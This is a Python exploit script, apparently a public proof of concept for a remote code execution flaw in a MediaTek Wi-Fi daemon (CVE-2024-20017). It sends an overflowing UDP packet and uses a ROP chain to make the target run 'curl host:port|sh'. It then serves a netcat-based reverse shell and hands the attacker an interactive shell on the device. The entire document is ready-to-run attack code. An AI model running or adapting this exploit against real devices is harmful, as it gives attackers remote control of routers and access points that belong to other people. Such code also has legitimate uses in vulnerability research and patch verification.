#!/usr/bin/env python3
import argparse
import sys
from collections import namedtuple
from pwn import *

# Namedtuple for target
Target = namedtuple('Target', ['host', 'port'])

# set pwntools log level
context.log_level = 'error'

# SIZE CONSTANTS
MAX_PKT_SIZE        = 1600
MIN_PKT_SIZE        = 16
PADDING_TO_RIP      = 232
MIN_BYTES_TO_RIP    = MIN_PKT_SIZE + PADDING_TO_RIP

# ===================== ADDRESSES ================================== #
# NOTE: these values will change for different build flags, compilers, etc. Adjust as needed.
DATA_SECT           = 0x479000
GOT_SYSTEM          = 0x402170
GOT_EXIT            = 0x402510

# ===================== ROP Gadgets ================================ #
# Pop next value on the stack into $rax; That value will be written to our desired address in the
# next gadget. This shifts the stack up by 0x18 bytes, and then pops a value off, so stack is left
# at rsp+0x10 so need padding between this gadget and the next to account for this.
#       pop rax;
#       add rsp, 0x18
#       pop rbx
#       pop rbp;
#       ret;
POP_RAX     = 0x42acd8

# Load rsp+0x50 to rdx, then write value of rax to addr in [rdx]. This will shift the stack up
# by 0x48 bytes before returning.
#       mov rdx, [rsp+0x50];
#       mov [rdx], rax;
#       xor eax, eax;
#       add rsp, 0x48;
#       ret;
MOV_RDX_RAX = 0x405574

# Pop a value off of the stack and return; used to realign the stack after $rsp is shifted by +0x48
# in the previous gadget. because that gadget gets our target write addr from rsp+0x50 and shifts
# by 0x48, that write addr would get popped into $rip by the ret in the prev gadget. doing a pop
# ret allows us to pop that off of the stack before doing another return to our next gadget.
#       pop rsi;
#       ret;
POP_RET = 0x44cf20

# Pop the next value on the stack to rdi to set up argument to system()
#       pop rdi; ret;
POP_RDI_RET = 0x44c664



def create_base():
    """
    create a basic SSB payload packet
    """
    # iapp header
    header = p8(0)      # version
    header += p8(50)    # command
    header += p16(0)    # ident
    header += p16(0x60) # length

    # SSB struct frame
    ssb_pkt = p8(0x23) * 8                  # char buf[8], InitVec
    # use big-endian here to simulate network byte order
    ssb_pkt += p16(0x400, endian='big')     # u16 Length

    final_pkt = header + ssb_pkt
    return final_pkt


def write_to_addr(addr, data):
    realign_stack = False

    # calculate padding needed
    if (len(data) % 8) != 0:
        pad = 8 - (len(data) % 8)
        data += b"\x55" * pad

        # check if our length will require stack alignment
        if (len(data) % 3) != 0:
            realign_stack = True

    bytes_left = len(data)
    chunk_size = 8
    curs1 = 0
    write_cursor = 0
    full_chain = b""

    # if we need to align the stack, place the ret gadget at the beginning of the chain
    if realign_stack:
        ret_gadget = 0x445e76
        full_chain += p64(ret_gadget)

    while bytes_left > 0:
        chunk = data[curs1:curs1+chunk_size]
        curs1 += chunk_size
        bytes_left -= chunk_size

        core_chain   = p64(POP_RAX)      # pop val to rax to get it written to [rdx]
        core_chain   += chunk            # this is WHAT we write
        core_chain   += b"\x44" * (24)   # handle add rsp, 0x18 (24 bytes) done by RAX gadget
        core_chain   += b"\x44" * (8*2)  # handle 'pop rbx; pop rbp;' done by RAX gadget
        core_chain   += p64(MOV_RDX_RAX) # mov rdx, [rsp+0x50], mov [rdx], rax; add rsp, 0x48;
                                         # put write addr 0x50 up
        core_chain   += b"\x66" * (0x48) # padding, stack will get adjusted by 0x48 by MOV gadget
        core_chain   += p64(POP_RET)     # pop rsi; ret; (to get the next val off the stack)

        # WRITE WHERE - this is what was popped to rdx by MOV_RDX_RAX gadget at [rsp+0x50]
        core_chain   += p64(addr + write_cursor)   # this is WHERE we write
        write_cursor += 8

        # the next val on the stack (i.e. next link in the ROP chain) is what will be left at the
        # top of rsp and what will get put in $rip next.

        # append this link to the chain
        full_chain += core_chain


    # check if our payload plus minimum bytes needed to get to rip hijack will be larger than
    # max bytes that can be sent per request.
    if (len(full_chain) + MIN_BYTES_TO_RIP) > MAX_PKT_SIZE:
        raise ValueError("Payload is too long! Can't be sent in a single request")

    return full_chain

def create(write_addr, cmd):
    """
    Compose the payload packet to trigger the overflow and write 4-bytes of `write_cont` to
    `write_addr`.
    """
    # Create base SSB packet
    final_pkt = create_base()

    # Padding is 232 from end of the base SSB packet to get to RIP
    final_pkt += b"\x11" * PADDING_TO_RIP

    # ------------- ARBITRARY WRITE ROP --------- #
    print(f"[*] Writing payload to .data segment @ {write_addr:#x}")
    print(f"[*] Using shell payload: '{cmd.decode()}'")
    writer_rop_chain = write_to_addr(write_addr, cmd)
    final_pkt += writer_rop_chain

    # ------------- TRIGGER system() ---------- #
    final_pkt   += p64(POP_RDI_RET)     # pop rdi
    final_pkt   += p64(write_addr)      # our command addr
    final_pkt   += p64(GOT_SYSTEM)      # system.got
    final_pkt   += p64(GOT_EXIT)        # exit.got

    return final_pkt


def serve_rev_shell_payload(host: str, port: int):
    """
    serve reverse shell payload and handle incoming reverse shell connection
    """

    # these commands will be returned to the target and piped to a shell
    reverse_shell_cmd   = "rm -f /tmp/f; mkfifo /tmp/f;"
    reverse_shell_cmd   += f"(cat /tmp/f | /bin/bash -i 2>&1 | nc {host} {port} >/tmp/f &)"
    reverse_shell_cmd = reverse_shell_cmd.encode()

    # basic HTTP response format
    http_head = f"HTTP/1.1 200 OK\r\nContent-Length: {len(reverse_shell_cmd)}\r\n"
    http_head += "Connection: Closed\r\n\r\n"
    http_head = http_head.encode()

    # compose full HTTP response : headers + body
    full_response = http_head + reverse_shell_cmd + b"\r\n\r\n"

    # handle the http request to serve script to spawn reverse shell
    listener = listen(port)
    listener.settimeout(1)
    http = listener.wait_for_connection()
    if http.connected():
        listener.sendline(full_response)
        listener.close()
    else:
        print("=ERROR=: Timed out waiting for staging connection, exploit likely failed")
        sys.exit(1)

    # wait for the incoming reverse shell connection; bail if we don't get it in a second.
    listener = listen(port)
    listener.settimeout(1)
    context.log_level = 'info'
    revshell = listener.wait_for_connection()
    if revshell.connected():
        print("[+] ~~~ <REVERSE SHELL START> ~~~")
        listener.interactive()
    else:
        print("[!] =ERROR=: Timed out waiting for reverse shell connection, exploit likely failed")
        sys.exit(1)

def main(args):
    """
    main function
    """
    args = poc_parser.parse_args()
    target = Target(args.target_ip, args.target_port)

    cmd = f"curl {args.lhost}:{args.lport}|sh;\x00"
    cmd = cmd.encode()

    packet_1 = create(write_addr=DATA_SECT, cmd=cmd)

    # create the connection and send the packet
    print("[+] Sending payload to hijack execution and start ROP chain")
    context.log_level = 'error'
    conn = remote(target.host, target.port, typ='udp')
    conn.send(packet_1)
    conn.close()

    # serve the reverse shell payload and then handle the incoming rev shell connection
    print("[+] Ready to handle incoming reverse shell...")
    serve_rev_shell_payload(args.lhost, args.lport)


if __name__ == "__main__":
    poc_parser = argparse.ArgumentParser(
        add_help=True,
        description='cve-2024-20017: mtk7622 wappd RCE (full RELRO, no stack cookies) -> reverse shell (by @hyprdude)',
        formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    poc_parser.add_argument(
        'target_ip',
        help='IP address of host running the service')
    poc_parser.add_argument(
        '--target_port',
        default=3517,
        help="Target port",
        type=int)
    poc_parser.add_argument(
        '--lhost',
        default="127.0.0.1",
        help="Bind IP for reverse shell listener",
        type=str)
    poc_parser.add_argument(
        '--lport',
        default=1337,
        help="Bind port for reverse shell listener",
        type=int)

    arguments = poc_parser.parse_args()
    main(arguments)
